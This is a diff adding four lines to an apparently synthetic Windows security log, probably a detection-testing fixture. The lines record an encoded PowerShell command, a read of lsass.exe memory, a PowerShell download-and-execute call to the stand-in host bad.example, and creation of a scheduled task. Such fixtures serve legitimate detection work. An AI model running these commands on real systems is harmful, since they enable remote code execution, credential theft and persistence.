@@ -1,0 +1,4 @@
+2026-08-22 09:14:12 host=WIN-01 event=Security command="powershell.exe -enc SQBFAFgA..." user=alice
+2026-08-22 09:15:02 host=WIN-02 event=Security object="lsass.exe" action=read user=system
+2026-08-22 09:16:44 host=WIN-03 event=PowerShell command="iex (New-Object Net.WebClient).DownloadString('http://bad.example')" user=bob
+2026-08-22 09:19:10 host=WIN-04 event=Security command="schtasks /create /tn updater" user=carol
